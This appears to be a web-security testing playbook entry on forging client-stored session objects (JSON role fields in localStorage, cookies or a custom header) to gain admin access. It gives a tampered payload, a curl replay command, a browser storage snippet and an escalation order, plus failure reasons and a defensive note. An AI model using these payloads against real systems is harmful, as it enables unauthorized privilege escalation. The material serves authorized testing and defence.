# Forged Client Session Role

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- login returns a JSON session object
- the browser stores it in `localStorage`, `sessionStorage`, or a writable cookie
- the frontend later sends that same object back to the server
- the server appears to trust fields such as `role`, `isAdmin`, or `permissions`

## Minimal Payload

```json
{"user":"guest","role":"admin"}
```

## Header Replay Example

```bash
curl -sS "https://[host]/api/staff" \
  -H 'X-Session: {"user":"guest","role":"admin"}'
```

## Browser Storage Example

```javascript
localStorage.setItem('session', JSON.stringify({
  user: 'guest',
  role: 'admin'
}));
location = '/staff';
```

## Escalation Order

Test one field at a time:

```text
role: guest -> staff
role: guest -> admin
isAdmin: false -> true
permissions: ["read"] -> ["admin"]
```

## Why It Works

The server is using mutable client-provided state as the authorization source of truth instead of verifying the claim against server-side state or a signed token.

## Why It Fails

- The server ignores the claim and uses a server-side session.
- The token is signed and verification fails after tampering.
- The privileged endpoint checks more than the role field.
- The required privileged role value differs from the one tested.

## Common Mistakes

- Assuming `staff` is the right privileged role without testing alternatives like `admin`.
- Changing several fields at once and losing the minimal proof.
- Forgetting that the browser may send the session in a custom header, not a cookie.
- Storing live flags or target-specific secrets in reusable payload files.

## Defensive Note

Client-side storage is not a trust boundary. Authorization claims must be server-derived or cryptographically verified.
